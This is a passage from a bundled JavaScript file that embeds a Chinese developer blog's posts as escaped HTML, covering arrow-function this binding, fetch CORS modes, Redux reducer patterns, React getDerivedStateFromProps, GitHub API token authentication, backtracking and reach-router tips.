<span class=\\"hljs-attr\\">show</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{<span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'obj1:\'</span>,<span class=\\"hljs-keyword\\">this</span>.a)}\\n};\\n\\n<span class=\\"hljs-keyword\\">let</span> obj2={\\n  <span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">2</span>,\\n  <span class=\\"hljs-comment\\">// this为调用时确定的对象</span>\\n  <span class=\\"hljs-attr\\">show</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{<span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'obj2:\'</span>,<span class=\\"hljs-keyword\\">this</span>.a)}\\n};\\n\\n<span class=\\"hljs-keyword\\">let</span> obj3 = {\\n  <span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">3</span>,\\n  <span class=\\"hljs-comment\\">// ②function有this指针,this是调用时确定</span>\\n  <span class=\\"hljs-attr\\">show</span> :<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    <span class=\\"hljs-comment\\">// ①向上找到function，沿用它的this</span>\\n    setTimeout(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{ <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'obj3:\'</span>,<span class=\\"hljs-keyword\\">this</span>.a) }, <span class=\\"hljs-number\\">100</span>);\\n  }\\n};\\n\\n<span class=\\"hljs-keyword\\">let</span> obj4={\\n  <span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">4</span>,\\n  <span class=\\"hljs-comment\\">// ②无this，继续向上找，指向window</span>\\n  <span class=\\"hljs-attr\\">show</span> :<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{\\n    <span class=\\"hljs-comment\\">// ①向上找到()=&gt;{}</span>\\n    setTimeout(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> { <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'obj4:\'</span>,<span class=\\"hljs-keyword\\">this</span>.a) }, <span class=\\"hljs-number\\">100</span>);\\n  }\\n};\\n\\n<span class=\\"hljs-keyword\\">let</span> obj5={\\n  <span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">1</span>,\\n  <span class=\\"hljs-attr\\">show</span>:{\\n    <span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">2</span>,\\n    <span class=\\"hljs-comment\\">// 向上并未能找到带有this的词法作用域，最终指向window</span>\\n    <span class=\\"hljs-attr\\">show</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{<span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'obj5:\'</span>,<span class=\\"hljs-keyword\\">this</span>.a)}\\n  }\\n};\\n\\nobj1.show(); <span class=\\"hljs-comment\\">// windowScope</span>\\nobj2.show(); <span class=\\"hljs-comment\\">// 2</span>\\nobj3.show(); <span class=\\"hljs-comment\\">// 3</span>\\nobj4.show(); <span class=\\"hljs-comment\\">// windowScope</span>\\nobj5.show.show() <span class=\\"hljs-comment\\">// windowScope</span></code></pre></code></pre>\\n<p>继续：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> btn=<span class=\\"hljs-built_in\\">document</span>.getElementById(<span class=\\"hljs-string\\">\\"btn\\"</span>);\\n<span class=\\"hljs-comment\\">// 定义的时候，向上一层寻找，指向window</span>\\nbtn.addEventListener(<span class=\\"hljs-string\\">\'click\'</span>,()=&gt;{\\n    <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-keyword\\">this</span>)\\n})\\n\\ntriggerClick(btn) <span class=\\"hljs-comment\\">// window</span></code></pre></code></pre>\\n<p>结论：</p>\\n<ol>\\n<li>对象方法中谨慎使用箭头函数</li>\\n<li>元素的方法谨慎使用箭头函数</li>\\n</ol>\\n","toc":[],"relatedTags":null,"created_at":"2018-06-09","timeArr":[2018,5,9,0,0,0,0],"title":"es6箭头函数的this","uuid":"9ef13100cd0019709df5ac5974b441155efa3b42","summary":"<p>箭头函数()=&gt;{},没有自己的this指针,this为上一层的的this指针</p>\\n<p>function(){},有自己的this指针,this指向调用时的对象</p>\\n<p>例子：</p>\\n<pre class=\\"hljs\\"><code>a=<span class=\\"hljs-string\\">\\"windowScope\\"</span>\\n<span class=\\"hljs-keyword\\">let</span> obj1={\\n  <span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">1</span>,\\n  <span class=\\"hljs-comment\\">// 向上找不到this指针，指向window</span>\\n  <span class=\\"hljs-attr\\">show</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>...</code></pre>","slug":"es6-jian-tou-han-shu-de-this","sha":"662ce20e60723f1b990376486a6f12aef2e2935c"}')},591:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"cors-vs-no-cors\\">cors .vs no-cors</h2>\\n<p>名词：</p>\\n<ul>\\n<li><p><code>CORS filtered response</code></p>\\n<blockquote>\\n<p>A CORS filtered response is a filtered response whose type is &quot;cors&quot;, header list excludes any headers in internal response’s header list whose name is not a CORS-safelisted response-header name, given internal response’s CORS-exposed header-name list, and trailer is empty.</p>\\n</blockquote>\\n</li>\\n<li><p><code>simple headers.</code></p>\\n<blockquote>\\n<p>A CORS-safelisted request-header is a header whose name is a byte-case-insensitive match for one of</p>\\n<p><code>Accept</code></p>\\n<p><code>Accept-Language</code></p>\\n<p><code>Content-Language</code></p>\\n<p><code>Content-Type</code> and whose value, once extracted, has a MIME type (ignoring parameters) that is <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code>, or <code>text/plain</code></p>\\n</blockquote>\\n</li>\\n<li><p><code>opaque filtered response</code></p>\\n<blockquote>\\n<p>An opaque filtered response is a filtered response whose type is &quot;opaque&quot;, url list is the empty list, status is 0, status message is the empty byte sequence, header list is empty, body is null, and trailer is empty.</p>\\n</blockquote>\\n</li>\\n</ul>\\n<hr>\\n<ul>\\n<li>cors</li>\\n</ul>\\n<p>设置<code>cors</code>跨域获取资源会提示报错，因为<code>cors</code>是跨域访问控制，需要客户端和服务端同时支持，\\n客户端不能设置为<code>same-origin</code>，服务端要设置<code>Access-Control-Allow-Origin</code>。</p>\\n<p>当服务端未设置<code>Access-Control-Allow-Origin</code>的时候，</p>\\n<ul>\\n<li>no-cors</li>\\n</ul>\\n<p>设置<code>no-cors</code>不会报错，能返回<code>简单数据</code>但不能读取，因为<code>no-cors</code>只能用于<code>simple-header</code>，\\n而且返回的是一个<code>opaque filtered response</code></p>\\n<p><code>no-cors</code>一般用于缓存静态资源，而不能用于解析数据</p>\\n<p><a href=\\"https://stackoverflow.com/questions/36292537/what-is-an-opaque-response-and-what-purpose-does-it-serve\\">nice answer</a></p>\\n<blockquote>\\n<p>Consider the case in which a service worker acts as an agnostic cache. Your only goal is serve the same resources you would get from network but faster. Of course you can&#39;t ensure all the resources will be part of your origin (consider libraries served from CDNs, for instance). As the service worker has the potential of altering network responses, you need to guarantee you are not interested on the contents of the response, nor on its headers, nor even on the result. You&#39;re only interested on the response as a black box to possibly cache it and serve it faster.</p>\\n<p>This is why { mode: &#39;no-cors&#39; } was made for.</p>\\n</blockquote>\\n","toc":[{"anchor":"cors-vs-no-cors","level":2,"text":"cors .vs no-cors"}],"relatedTags":null,"created_at":"2018-07-12","timeArr":[2018,6,12,0,0,0,0],"title":"fetch-corsVSno-cors","uuid":"26780522dc2b9dd466ebe91331b58247e5f73627","summary":"<p>A CORS filtered response is a filtered response whose type is &quot;cors&quot;, header list excludes any headers in internal response’s header list whose name is not a CORS-safelisted response-header name, given internal response’s CORS-exposed header-name list, and trailer is empty.</p>","slug":"fetch-corsVSno-cors","sha":"17a85d07a1ae45e6a8f6857bf3c621bfba2bd674"}')},592:function(n){n.exports=JSON.parse('{"content":"<p>###3 Redux的复用</p>\\n<p>因为每一次dispatch都是遍历所有reducer寻找type，因此每一个action的type不能一致，\\n当需要复用reducer时，可以使用prefix</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">generateReducer</span>(<span class=\\"hljs-params\\">prefix,state</span>)</span>{\\n  <span class=\\"hljs-keyword\\">const</span> SOMETYPE=prefix+<span class=\\"hljs-string\\">\'SOMETYPE\'</span>;\\n  <span class=\\"hljs-keyword\\">const</span> initialState={...state}\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">reducer</span>(<span class=\\"hljs-params\\">state=initialState,action</span>)</span>{\\n    <span class=\\"hljs-comment\\">//...</span>\\n  }\\n}</code></pre></code></pre>\\n<p>###3 Redux的增强</p>\\n<p>增强redux通过3点进行</p>\\n<ul>\\n<li>处理额外的action</li>\\n<li>维护更多state</li>\\n<li>action能传递给原始reducer处理</li>\\n</ul>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">HOCReducer</span>(<span class=\\"hljs-params\\">reducer</span>)</span>{\\n  <span class=\\"hljs-comment\\">// 此处可以配置更多state</span>\\n  <span class=\\"hljs-keyword\\">const</span> initialState={}\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">state=initialState,action</span>)</span>{\\n    <span class=\\"hljs-comment\\">// 此处处理额外的action</span>\\n    <span class=\\"hljs-keyword\\">switch</span>(action.type){\\n      <span class=\\"hljs-keyword\\">case</span> <span class=\\"hljs-string\\">\'additionalType\'</span>:\\n        <span class=\\"hljs-comment\\">/*do something*/</span>\\n        <span class=\\"hljs-keyword\\">return</span>  <span class=\\"hljs-comment\\">/*{...}*/</span>;\\n      <span class=\\"hljs-keyword\\">default</span>:\\n        <span class=\\"hljs-comment\\">// 遇到无匹配的action，返回给原始reducer处理</span>\\n        <span class=\\"hljs-keyword\\">const</span> newState=reducer(initialState,action)\\n        <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-comment\\">/*{...}*/</span>\\n    }\\n  }\\n}</code></pre></code></pre>\\n<p>调用：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> {createStroe} <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'redux\'</span>;\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">reducer</span>(<span class=\\"hljs-params\\">state={},action</span>)</span>{\\n  <span class=\\"hljs-keyword\\">switch</span>(action.type){\\n    <span class=\\"hljs-comment\\">/* 初始的reducer*/</span>\\n  }\\n}\\n<span class=\\"hljs-keyword\\">const</span> hocReducer=HOCReducer(reducer);\\n<span class=\\"hljs-keyword\\">const</span> store=createStroe(hocReducer);\\n\\n<span class=\\"hljs-comment\\">/* dispatch后就会从hocReducer开始执行遍历*/</span></code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-06-25","timeArr":[2018,5,25,0,0,0,0],"title":"高阶redux的使用","uuid":"0c096d72d4add9e9c5b5fcc24624e4c8d6669aec","summary":"<p>###3 Redux的复用</p>\\n<p>因为每一次dispatch都是遍历所有reducer寻找type，因此每一个action的type不能一致，\\n当需要复用reducer时，可以使用prefix</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">generateReducer</span>(<span class=\\"hljs-params\\">prefix,state</span>)</span>{\\n  <span class=\\"hljs-keyword\\">const</span> SOMETYPE=pr...</code></pre>","slug":"gao-jie-redux-de-shi-yong","sha":"1a051b70892a766030ca8e55ac15f3c3fbb2d887"}')},593:function(n){n.exports=JSON.parse('{"content":"<p>react的<code>getDerivedStateFromProps</code>内部不可以有副作用，因为现在是无论是state改变还是props改变，\\n都会执行它。</p>\\n<p>例如：</p>\\n<p>这种写法会导致多次循环渲染直到报错</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">App</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Component</span> </span>{\\n  <span class=\\"hljs-keyword\\">constructor</span>(props){\\n    <span class=\\"hljs-keyword\\">super</span>(props)\\n    <span class=\\"hljs-keyword\\">this</span>.myFetch=<span class=\\"hljs-keyword\\">this</span>.myFetch.bind(<span class=\\"hljs-keyword\\">this</span>)\\n    <span class=\\"hljs-keyword\\">this</span>.state = {\\n      <span class=\\"hljs-attr\\">name</span>: <span class=\\"hljs-string\\">\\"\\"</span>,\\n      <span class=\\"hljs-attr\\">list</span>: <span class=\\"hljs-literal\\">null</span>,\\n      <span class=\\"hljs-attr\\">myFetch</span>:<span class=\\"hljs-keyword\\">this</span>.myFetch\\n    };\\n  }\\n\\n\\n  <span class=\\"hljs-keyword\\">static</span> getDerivedStateFromProps(props, state) {\\n    <span class=\\"hljs-keyword\\">if</span> ( props.name !== state.name ) {\\n      <span class=\\"hljs-comment\\">// 这一句是有副作用的，它会改变state状态，</span>\\n      <span class=\\"hljs-comment\\">// 然后再次调用getDerivedStateFromProps，再次改变state状态...</span>\\n      state.myFetch(props.name)\\n      <span class=\\"hljs-keyword\\">return</span> {\\n        <span class=\\"hljs-attr\\">name</span>: props.name\\n      };\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">null</span>;\\n  }\\n  myFetch(){\\n      <span class=\\"hljs-keyword\\">this</span>.setState({\\n        <span class=\\"hljs-attr\\">list</span>: <span class=\\"hljs-string\\">\\"newList\\"</span>\\n      })\\n  }\\n  render() {\\n    <span class=\\"hljs-keyword\\">return</span> (\\n      &lt;div&gt;{this.state.list}&lt;/div&gt;\\n    );\\n  }\\n}</code></pre></code></pre>\\n<p>以上正确写法应为：</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">App</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Component</span> </span>{\\n  <span class=\\"hljs-keyword\\">constructor</span>(props){\\n    <span class=\\"hljs-keyword\\">super</span>(props)\\n    <span class=\\"hljs-keyword\\">this</span>.myFetch=<span class=\\"hljs-keyword\\">this</span>.myFetch.bind(<span class=\\"hljs-keyword\\">this</span>)\\n    <span class=\\"hljs-keyword\\">this</span>.state = {\\n      <span class=\\"hljs-attr\\">name</span>: <span class=\\"hljs-string\\">\\"\\"</span>,\\n      <span class=\\"hljs-attr\\">list</span>: <span class=\\"hljs-literal\\">null</span>,\\n      <span class=\\"hljs-comment\\">//myFetch:this.myFetch</span>\\n    };\\n  }\\n\\n  <span class=\\"hljs-comment\\">// 纯函数，无副作用</span>\\n  <span class=\\"hljs-keyword\\">static</span> getDerivedStateFromProps(props, state) {\\n    <span class=\\"hljs-keyword\\">if</span> ( props.name !== state.name ) {\\n      <span class=\\"hljs-keyword\\">return</span> {\\n        <span class=\\"hljs-attr\\">name</span>: props.name,\\n        <span class=\\"hljs-attr\\">list</span>: <span class=\\"hljs-literal\\">null</span>\\n      };\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">null</span>;\\n  }\\n  componentDidUpdate(){\\n    <span class=\\"hljs-keyword\\">if</span>(!<span class=\\"hljs-keyword\\">this</span>.state.list){\\n      <span class=\\"hljs-keyword\\">this</span>.myFetch(<span class=\\"hljs-keyword\\">this</span>.props.name)\\n    }\\n  }\\n\\n  <span class=\\"hljs-comment\\">// 看是否需要初始化的时候调用</span>\\n  componentDidMount(){\\n    <span class=\\"hljs-keyword\\">this</span>.myFetch(<span class=\\"hljs-keyword\\">this</span>.props.name)\\n  }\\n\\n  myFetch(){\\n    <span class=\\"hljs-keyword\\">this</span>.setState({\\n      <span class=\\"hljs-attr\\">list</span>: <span class=\\"hljs-string\\">\\"newList\\"</span>\\n    })\\n  }\\n  render() {\\n    <span class=\\"hljs-keyword\\">return</span> (\\n      &lt;div&gt;{this.state.list}&lt;/div&gt;\\n    );\\n  }\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-06-07","timeArr":[2018,5,7,0,0,0,0],"title":"getDerivedStateFromProps","uuid":"5a309baed59601de7885e379ac2562b045fb413d","summary":"<p>react的<code>getDerivedStateFromProps</code>内部不可以有副作用，因为现在是无论是state改变还是props改变，\\n都会执行它。</p>\\n<p>例如：</p>\\n<p>这种写法会导致多次循环渲染直到报错</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">App</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Component</span> </span>{\\n  <span class=\\"hljs-keyword\\">constructor</span>(props){\\n  ...</code></pre>","slug":"getDerivedStateFromProps","sha":"b0683499799fb64f81d0d942134c7304c29cc5f0"}')},594:function(n){n.exports=JSON.parse('{"content":"<p>最近在合并一些项目，有些用<code>Vue</code>，有的用<code>React</code>，需要将它们整合成一个项目，就用了自己的多页面项目框架，几点感受和需要改进的想法记录下。</p>\\n<p>一些感受：</p>\\n<ul>\\n<li>总的来说合并还是比较顺利的，一些依赖组件比较旧，因此另外一些依赖组件必须降级才能兼容使用；</li>\\n<li>由于目前不同的框架还是占用不同页面，需要另外一个独立的导航栏；</li>\\n<li>另外，如果页面名称和路由名称也是不能重复，否则会造成冲突</li>\\n</ul>\\n<p>需要改进：</p>\\n<ul>\\n<li>页面名称和路由名称冲突问题，考虑：(检测机制？新的规则(<code>spa</code>目录下不编译其他页面)？)</li>\\n<li>框架合并不能做到同页面的合并，尝试：(多个前端框架)，考虑：（框架之前通信问题），参考：（微前端）</li>\\n<li>页面固定逻辑文件太多，考虑复用</li>\\n</ul>\\n<p>总的来说，小问题遇到很多，但也容易解决，大问题往往都是结构性的问题，必须主动去发现，多方面考虑。</p>\\n","toc":[],"relatedTags":null,"created_at":"2021-06-06","timeArr":[2021,5,6,0,0,0,0],"title":"关于多页面架构的一些改进记录","uuid":"eb0d4100c186d638be56c73f46e9a3c7b79ef557","summary":"<p>最近在合并一些项目，有些用<code>Vue</code>，有的用<code>React</code>，需要将它们整合成一个项目，就用了自己的多页面项目框架，几点感受和需要改进的想法记录下。</p>\\n<p>一些感受：</p>\\n<ul>\\n<li>总的来说合并还是比较顺利的，一些依赖组件比较旧，因此另外一些依赖组件必须降级才能兼容使用；</li>\\n<li>由于目前不同的框架还是占用不同页面，需要另外一个独立的导...</li>\\n</ul>","slug":"guan-yu-duo-ye-mian-jia-gou-de-yi-xie-gai-jin-ji-lu","sha":"ab7b2795a1c62781543e7cd495aa91abce71e480"}')},595:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"githubapi-authorization\\">GithubAPI-Authorization</h2>\\n<p>一些特定的API，例如获取<code>user</code>的public资料，<code>repo</code>的内容等，不认证也可以获取，\\n区别是，不认证，大约每个小时只有60次调用的次数限制，而使用认证后，则大约有5000次的调用次数。</p>\\n<p>认证有2方面，</p>\\n<ol>\\n<li><p>使用你自己的名义去做一些事情</p>\\n</li>\\n<li><p>使用他人的名义去做一些事情</p>\\n</li>\\n</ol>\\n<h3 id=\\"yi-zi-ji-ming-yi\\">以自己名义</h3>\\n<p>先说第一种，第一种，当然可以在网页上操作，这是最直接的，如果你需要用控制台调用api，\\n那么你需要建立一个<code>personal token</code>，在github的setting里面，里面可以勾选对应的<code>scope</code>也就是允许的范围。</p>\\n<p>例如，勾选<code>public_repo</code>，那么就可以使用api去<code>create issue</code>，<code>create comment</code>等等</p>\\n<p>具体的调用方式可以放在header或者parameter</p>\\n<ul>\\n<li>header</li>\\n</ul>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> request = <span class=\\"hljs-keyword\\">new</span> Request(<span class=\\"hljs-string\\">\'https://api.github.com/user/{username}\'</span>,{\\n    <span class=\\"hljs-attr\\">headers</span>: <span class=\\"hljs-keyword\\">new</span> Headers({\\n      <span class=\\"hljs-string\\">\'Authorization\'</span>: <span class=\\"hljs-string\\">\'token xxxxxxxxxxxxxxxx\'</span>\\n    })\\n});\\nfetch(request)\\n.then(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">data</span>=&gt;</span>data.json()).then(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">obj</span>=&gt;</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(obj)\\n})</code></pre></code></pre>\\n<ul>\\n<li>parameter</li>\\n</ul>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>fetch(<span class=\\"hljs-string\\">\\"https://api.github.com/user/{username}/?access_token=token xxxxxxxxxxxxxx\\"</span>)\\n.then(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">data</span>=&gt;</span>data.json()).then(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">obj</span>=&gt;</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(obj)\\n})</code></pre></code></pre>\\n<h3 id=\\"yi-ta-ren-ming-yi\\">以他人名义</h3>\\n<p>可以使用第三方认证，也就是setting里面的<code>oAuth token</code>，填写你的应用或网站的url，\\n<code>callback</code>的意思是，当客户认证完毕会重定向到哪里。</p>\\n<p><code>callback</code>一般指向的是你自己的服务器，在那里你需要将重定向的url中的参数<code>code</code>，你的<code>client_id</code>，<code>client_secret</code>合并去获取用户的<code>token</code>。</p>\\n<p>然后就可以像使用这个token(使用方法见上面)去做一些事情了。</p>\\n<p>注意：</p>\\n<ol>\\n<li><code>client_secret</code>不可以透漏给其他人，否则别人可以借你的名义去获取其他人的授权。</li>\\n<li>关于合并数据获取token的过程，要在后端进行，前端也可以进行，但没有安全性可言。</li>\\n</ol>\\n","toc":[{"anchor":"githubapi-authorization","level":2,"text":"GithubAPI-Authorization"},{"anchor":"yi-zi-ji-ming-yi","level":3,"text":"以自己名义"},{"anchor":"yi-ta-ren-ming-yi","level":3,"text":"以他人名义"}],"relatedTags":null,"created_at":"2018-09-28","timeArr":[2018,8,28,0,0,0,0],"title":"关于github-api.v3认证方面的总结","uuid":"734ec46092d55f646e70dce2766a3c42e017cad4","summary":"<h4>GithubAPI-Authorization</h4>\\n<p>一些特定的API，例如获取<code>user</code>的public资料，<code>repo</code>的内容等，不认证也可以获取，\\n区别是，不认证，大约每个小时只有60次调用的次数限制，而使用认证后，则大约有5000次的调用次数。</p>\\n<p>认证有2方面，</p>\\n<ol>\\n<li>\\n<p>使用你自己的名义去做一些事情</p>\\n</li>\\n<li>\\n<p>...</p>\\n</li>\\n</ol>","slug":"guan-yu-github-api.v3-ren-zheng-fang-mian-de-zong-jie","sha":"6b205fb9eb1995355142e4b491f0e45bac6ca9f9"}')},596:function(n){n.exports=JSON.parse('{"content":"<p>今天在LeetCode看到一篇非常有价值的讨论，列举了一系列列数组的<code>回溯算法</code>，自己动手一个个完成后，\\n感觉对理解回溯算法的原理有很大帮助。</p>\\n<p>就用一篇文章记录下解析过程。</p>\\n<p><a href=\\"https://leetcode.com/problems/combination-sum/discuss/16502/A-general-approach-to-backtracking-questions-in-Java-(Subsets-Permutations-Combination-Sum-Palindrome-Partitioning)\\">原文地址</a></p>\\n<p>其实回溯就是按顺序的一种穷举，但是它会设定<code>停止条件</code>和<code>达成条件</code></p>\\n<p>一旦符合<code>停止条件</code>，直接整体跳过，包括它后面的子集全部跳过</p>\\n<p>一旦符合<code>达成条件</code>，便是所需要的数据，添加到结果集合里</p>\\n<p>一个简单的例子：</p>\\n<pre><code><pre class=\\"hljs\\"><code>列举数组arr的所有的长度相同的组合，字符不重复\\n例如：[1,2,3]\\n输出：\\n[\\n  [1,2,3],\\n  [1,3,2],\\n  [2,1,3],\\n  [2,3,1],\\n  [3,1,2],\\n  [3,2,1]\\n]</code></pre></code></pre><p>代码：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">subSet</span>(<span class=\\"hljs-params\\">nums</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> result=[],temp=[]\\n  backtrack(result,temp,nums)\\n  <span class=\\"hljs-keyword\\">return</span> result\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">backtrack</span>(<span class=\\"hljs-params\\">result,temp,nums</span>)</span>{\\n    <span class=\\"hljs-comment\\">// 达成条件</span>\\n    <span class=\\"hljs-keyword\\">if</span>(temp.length===nums.length)result.push(temp.slice())\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;nums.length;i++){\\n      <span class=\\"hljs-comment\\">// 停止条件</span>\\n      <span class=\\"hljs-keyword\\">if</span>(temp.includes(nums[i]))<span class=\\"hljs-keyword\\">continue</span>\\n      temp.push(nums[i])\\n      backtrack(result,temp,nums)\\n      temp.pop()\\n    }\\n  }\\n}</code></pre></code></pre>\\n<p>它的运行轨迹：</p>\\n<pre><code><pre class=\\"hljs\\"><code>1\\n1 1   ×\\n1 2\\n1 2 1 ×\\n1 2 2 ×\\n1 2 3 √\\n1 3\\n1 3 1 ×\\n1 3 2 √\\n1 3 3 ×\\n2\\n2 1\\n2 1 1 ×\\n2 1 2 ×\\n2 1 3 √\\n2 2   ×\\n2 3\\n2 3 1 √\\n2 3 2 ×\\n2 3 3 ×\\n3\\n3 1\\n3 1 1 ×\\n3 1 2 √\\n3 1 3 ×\\n3 2\\n3 2 1 √\\n3 2 2 ×\\n3 2 3 ×\\n3 3   ×</code></pre></code></pre><p>一旦父级达到<code>停止条件</code>，例如<code>2 2</code>，像后面的子集<code>2 2 1</code>，<code>2 2 2</code>都不会进行</p>\\n<p>当通过的<code>停止条件</code>并且符合<code>达成条件</code>的，就是结果。</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-06","timeArr":[2018,9,6,0,0,0,0],"title":"关于回溯算法(backtrack)的模板解析","uuid":"362c875dc274eb593fe68c8afd58f51afebc57c9","summary":"<p>今天在LeetCode看到一篇非常有价值的讨论，列举了一系列列数组的<code>回溯算法</code>，自己动手一个个完成后，\\n感觉对理解回溯算法的原理有很大帮助。</p>\\n<p>就用一篇文章记录下解析过程。</p>\\n<p>[原文地址](https://leetcode.com/problems/combination-sum/discuss/16502/A-ge...</p>","slug":"guan-yu-hui-su-suan-fa-(backtrack)-de-mu-ban-jie-xi","sha":"8392ce085e533c1fff99ad21b3d8583449fec2d3"}')},597:function(n){n.exports=JSON.parse('{"content":"<p>reach-router是一个轻量级的router组件，当然功能也相对于react-router少了一些。</p>\\n<p>近期使用的时候遇到以下问题，在这里总结一次</p>\\n<ol>\\n<li><p>router遇到<code>url:parameter</code> ，当无法匹配的情况，默认会一直读取loading组件，因为它不知道这个参数是否有效，</p>\\n<p> 需要自行判断<code>parameter</code>是不是有效参数，然后再处理不匹配的情况(可以使用navigate)</p>\\n</li>\\n<li><p>react-router有一个功能，<code>url:?params</code>意思是存在或者不存在params都能匹配到，而reach-router并没有</p>\\n<p> 因此遇到url参数可有可无状况可以使用以下写法：</p>\\n<pre><code><pre class=\\"hljs\\"><code> &lt;Home path=&quot;/&quot; page={1} /&gt;\\n &lt;Home path=&quot;page/:page&quot; /&gt;</code></pre></code></pre></li>\\n<li><p>关于router的点击后会自动scroll的问题</p>\\n<p> 这应该是一个SPA的通病，点击link就像锚链接一样，跳转到link的位置，也是需要自己解决，如下：</p>\\n<pre><code><pre class=\\"hljs\\"><code> componentDidMount() {\\n   requestAnimationFrame(() =&gt; {\\n     window.scrollTo(0, 0);\\n   });\\n }</code></pre></code></pre></li>\\n</ol>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-11","timeArr":[2018,9,11,0,0,0,0],"title":"关于近期使用reach-router的一些总结","uuid":"d8bf00a3ca68fe4e1b5c7acde9855e2148c7762f","summary":"<p>reach-router是一个轻量级的router组件，当然功能也相对于react-router少了一些。</p>\\n<p>近期使用的时候遇到以下问题，在这里总结一次</p>\\n<ol>\\n<li>\\n<p>router遇到<code>url:parameter</code> ，当无法匹配的情况，默认会一直读取loading组件，因为它不知道这个参数是否有效，</p>\\n<p>需要自行判断`...</p>\\n</li>\\n</ol>","slug":"guan-yu-jin-qi-shi-yong-reach-router-de-yi-xie-zong-jie","sha":"3a57533a3dc20f28769f523891951917242119ad"}')},598:function(n){n.exports=JSON.parse('{"content":"<p><a href=\\"https://leetcode.com/problems/maximum-product-of-word-lengths/\\">原题目</a>：\\n给定一个字符串数组，找到长度的最大值<code>length(word[i]) * length(word[j])</code>，其中两个单词中的字母无相同。您可以假定每个单词只包含小写字母。如果没有这两个词，返回0。</p>\\n<p>例：</p>\\n<pre><code><pre class=\\"hljs\\"><code>Input: [&quot;abcw&quot;,&quot;baz&quot;,&quot;foo&quot;,&quot;bar&quot;,&quot;xtfn&quot;,&quot;abcdef&quot;]\\nOutput: 16 \\nExplanation: The two words can be &quot;abcw&quot;, 